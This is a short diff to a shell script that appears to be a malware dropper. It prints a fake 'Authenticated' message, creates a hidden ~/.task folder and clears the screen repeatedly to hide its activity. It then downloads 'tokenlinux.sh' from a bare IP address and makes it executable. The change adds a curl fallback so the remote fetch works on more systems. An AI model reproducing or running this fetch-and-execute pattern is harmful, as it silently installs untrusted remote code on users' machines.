@@ -4,7 +4,13 @@ echo "Authenticated"
 mkdir -p "$HOME/.task"
 TARGET_DIR="$HOME/.task"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.sh" "http://64.204.80.251/599/tokenlinux.sh"
+if command -v curl &> /dev/null; then
+  curl -s -L -o "$TARGET_DIR/tokenlinux.sh" "http://64.204.80.251/599/tokenlinux.sh"
+elif command -v wget &> /dev/null; then
+  wget -q -O "$TARGET_DIR/tokenlinux.sh" "http://64.204.80.251/599/tokenlinux.sh"
+else
+  exit 1
+fi
 clear
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 clear
